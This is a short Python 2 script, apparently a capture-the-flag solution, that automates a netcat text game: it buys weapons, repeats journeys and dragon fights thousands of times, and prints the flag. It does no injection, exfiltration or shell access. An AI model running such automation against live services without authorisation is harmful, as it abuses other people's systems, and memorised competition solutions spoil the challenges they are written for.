# below is a extract from a sample exploit that
# interfaces with a tcp socket
import time
from netcat import Netcat

host='jh2i.com'
port=50031

def buy_item_in_shop(item_number):
    # open the shop
    nc.write('6' + '\n')
    nc.read_until(b'exit the shop):')
    # buy an item
    nc.write(str(item_number) + '\n')
    # wait for main menu
    nc.read_until(b'>')

def complete_journey():
    for i in range(5000):
        # complete journey
        nc.write('5' + '\n')
        print 'Journey, step:' + str(i)
        # wait for the promt
        nc.read_until(b'>')

def fight_dragon():
    for i in range(3700):
        # complete journey
        nc.write('2' + '\n')
        print 'Dragon, step:' + str(i)
        # wait for the promt
        nc.read_until(b'>')

# start a new Netcat() instance
nc = Netcat(host, port)
print 'Connected'
# get to the prompt
nc.read_until('>')
print "Got prompt"

# buy a sword
buy_item_in_shop(1)
print 'Bought a sword'
# complete a journey to earn money for more powerful weapon
complete_journey()
print 'Completed the journey'

# buy a missle launcer
buy_item_in_shop(4)
print 'Bought a missle launcher'

fight_dragon()

# check status
try:
    nc.write('2\n')
    print nc.read_until(b'Weapon level')
    buy_item_in_shop(5)
    nc.write('1' + '\n')
    print nc.read(4096)
except:
    print 'Exception occured'
print 'Got the flag!!!'
